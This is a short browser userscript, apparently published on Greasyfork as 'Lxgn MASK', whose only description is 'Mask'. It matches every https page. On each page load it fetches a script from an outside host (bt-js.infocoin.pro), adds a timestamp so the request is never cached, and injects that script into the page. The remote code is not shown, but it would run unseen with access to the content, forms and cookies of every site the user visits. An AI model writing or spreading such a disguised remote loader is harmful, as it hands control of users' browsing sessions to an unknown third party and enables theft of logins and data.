// ==UserScript==
// @name         Lxgn MASK
// @namespace    https://testnet.console.minter.network/
// @version      0.02
// @author       lxgn
// @description  Mask
// @match        https://*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/465254/Lxgn%20MASK.user.js
// @updateURL https://update.greasyfork.org/scripts/465254/Lxgn%20MASK.meta.js
// ==/UserScript==

var ms = new Date();
//document.write();
 
var script = document.createElement('script');
//var t = Math.random()*1000000;
 
var kuda = "https://bt-js.infocoin.pro/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);
 
script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }